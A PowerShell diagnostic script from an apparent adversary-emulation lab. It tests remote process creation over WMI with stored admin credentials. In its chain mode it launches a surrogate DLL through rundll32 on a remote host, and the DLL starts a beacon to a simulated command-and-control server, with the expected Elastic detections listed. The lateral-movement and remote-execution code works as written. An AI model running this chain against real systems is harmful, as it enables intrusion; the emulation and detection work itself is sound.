<#
.SYNOPSIS
WMI -> rundll32 -> 143.dll diagnostic matrix (gap G2 re-check).

Run from the OPERATOR STATION (C2 host 192.168.50.1) BEFORE the S8b pivot decision.
Re-tests the claim "rundll32+ANY-DLL via WMI process call create = ReturnValue 9
(session-0 / window-station)" with CLEAN command lines (no nested cmd/runas
quoting), because every earlier with-DLL attempt used `\"...\"` wmic escaping that
mangles the CommandLine (CreateProcess then fails with ERROR_PATH_NOT_FOUND = 9)
while `rundll32.exe` alone (no args, no quotes) returned 0. See
docs/rerun-v2-remote-operator-design.md §4.

Transport: SWbemLocator COM = the same DCOM/WMI path wmic uses (New-CimSession
-Authentication Dcom is no longer accepted by PowerShell 7 CIM).

Variants:
  V7 control: cmd.exe /c exit (transport sanity)
  V6 control: rundll32.exe alone                    (old diag: ReturnValue 0)
  V5 probe  : rundll32.exe user32.dll,MessageBeep   (old diag claimed 9 for ANY DLL)
  V1 chain  : rundll32.exe C:\C0015\c0015_143_surrogate.dll,LabEntry (bare app name)
  V2 chain  : C:\Windows\System32\rundll32.exe C:\C0015\c0015_143_surrogate.dll,LabEntry
  V3 chain  : V2 with a separate SWbemLocator instance (session-variant)

Mode:
  -Probe (default): V5/V6/V7 only - NO S8b side effects.
  -Chain: V1-V3 against the REAL 143.dll (starts marker + session-2 beacon -> receipt ART-07-01).

Passwords: -CredFile only (DPAPI Export-CliXml, gitignored); never plaintext.
Usage:
  powershell -ExecutionPolicy Bypass -File stage/analysis/wmi_rundll32_diag.ps1 -Probe  -CredFile stage/lab-credentials-itadmin.xml
  powershell -ExecutionPolicy Bypass -File stage/analysis/wmi_rundll32_diag.ps1 -Chain  -CredFile stage/lab-credentials-itadmin.xml
#>
[CmdletBinding()]
param(
    [string]$Target = 'FS01',
    [string]$CredFile = '',                      # optional DPAPI Export-CliXml; else current token
    [string]$Dll = 'C:\C0015\c0015_143_surrogate.dll',
    [string]$OutFile = 'stage/ws01/pivot-diag-v2.txt',
    [switch]$Probe,                              # default
    [switch]$Chain,                              # real 143.dll (S8b side effects)
    [switch]$Local                               # against '.'
)
$ErrorActionPreference = 'Stop'
$repo = (Get-Item (Join-Path $PSScriptRoot '..\..')).FullName
$OutFile = Join-Path $repo $OutFile
if (-not $Probe -and -not $Chain) { $Probe = $true }

$cred = $null
if ($CredFile) {
    $cf = Join-Path $repo $CredFile
    if (-not (Test-Path $cf)) { throw "cred file not found: $cf (run make_lab_creds.ps1 first)" }
    $cred = Import-CliXml $cf
}

$rows = New-Object System.Collections.Generic.List[string]
function Row([string]$r) { Write-Host $r; $rows.Add($r) }

function Invoke-ComCreate {
    param([string]$CommandLine)
    $loc = New-Object -ComObject WbemScripting.SWbemLocator
    if ($Local -or -not $cred) {
        $svc = $loc.ConnectServer('.', 'root\cimv2')
    } else {
        $svc = $loc.ConnectServer($Target, 'root\cimv2', $cred.UserName, $cred.GetNetworkCredential().Password)
    }
    $svc.Security_.ImpersonationLevel = 3   # Impersonate (process creation)
    $mi = $svc.Get('Win32_Process')
    return $mi.Create($CommandLine)
}

Row ("== WMI->rundll32 diag v3  target=$Target mode=$(if ($Chain) {'CHAIN'} else {'PROBE'}) utc=$(Get-Date -Format o) ==")
if ($cred) { Row ("   cred file: $CredFile (identity: $($cred.UserName))") }
if (-not $Chain -and -not $Local) {
    Row ("   prereq marker check: \\$Target\C$\C0015\c0015_143-executed.txt exists=$(Test-Path "\\$Target\C$\C0015\c0015_143-executed.txt")")
}

if ($Probe) {
    Row '--- PROBE (no S8b side effects) ---'
    foreach ($v in @(
        @{ id = 'V7'; cmd = 'cmd.exe /c exit'; },
        @{ id = 'V6'; cmd = 'C:\Windows\System32\rundll32.exe' },
        @{ id = 'V5'; cmd = 'C:\Windows\System32\rundll32.exe C:\Windows\System32\user32.dll,MessageBeep' }
    )) {
        $t0 = Get-Date
        try {
            $r = Invoke-ComCreate -CommandLine $v.cmd
            Row ("  {0}: ReturnValue={1} ProcessId={2} ({3} ms)  cmd=[{4}]" -f $v.id, $r.ReturnValue, $r.ProcessId,
                 [int]((Get-Date) - $t0).TotalMilliseconds, $v.cmd)
        } catch {
            Row ("  {0}: ERROR {1}  cmd=[{2}]" -f $v.id, $_.Exception.Message, $v.cmd)
        }
    }
    Row '--- V5=0 => rundll32+ANY-DLL via WMI OK (G2 retract); V5=9 => investigate further ---'
    Row '--- next: -Chain for the real S8b pivot ---'
}

if ($Chain) {
    Row '--- CHAIN (real 143.dll -> marker + session-2 beacon + receipt) ---'
    $staged = Join-Path $repo 'stage/ws01/c0015_143_surrogate.dll'
    if (Test-Path $staged) {
        Row ("   staged DLL sha256 = {0} (compare ART-06-01 CBCD2A8B8137BDEDE43C158FDD8C97268DA88B680C2155B1551FBA86301C8A3D)" -f (Get-FileHash $staged -Algorithm SHA256).Hash)
    } else {
        Row "   staged DLL missing: $staged (build/deploy first)"
    }
    foreach ($v in @(
        @{ id = 'V1'; cmd = "rundll32.exe $Dll,LabEntry" },
        @{ id = 'V2'; cmd = "C:\Windows\System32\rundll32.exe $Dll,LabEntry" },
        @{ id = 'V3'; cmd = "C:\Windows\System32\rundll32.exe $Dll,LabEntry" }
    )) {
        $t0 = Get-Date
        try {
            $r = Invoke-ComCreate -CommandLine $v.cmd
            Row ("  {0}: ReturnValue={1} ProcessId={2} ({3} ms)  cmd=[{4}]" -f $v.id, $r.ReturnValue, $r.ProcessId,
                 [int]((Get-Date) - $t0).TotalMilliseconds, $v.cmd)
            if ($r.ReturnValue -eq 0 -and $r.ProcessId) {
                Start-Sleep -Seconds 6   # LabEntry spawns the beacon + writes the marker
                $marker = "\\$Target\C$\C0015\c0015_143-executed.txt"
                Row ("      marker $marker exists=$((Test-Path $marker))  (beacon register -> c2sim.log / ART-07-01)")
            } else {
                Row '      chain NOT started by this variant (ReturnValue != 0); try next variant or loader fallback (G7)'
            }
        } catch {
            Row ("  {0}: ERROR {1}  cmd=[{2}]" -f $v.id, $_.Exception.Message, $v.cmd)
        }
    }
    Row '--- expect on Elastic: FS01 E1 wmiprvse->rundll32 + E7 143.dll + E11 marker + E3 :8080; receipt at register ---'
}

New-Item -ItemType Directory -Force -Path (Split-Path $OutFile -Parent) | Out-Null
$rows | Set-Content -LiteralPath $OutFile -Encoding UTF8
Row ("== results written to {0} ==" -f $OutFile)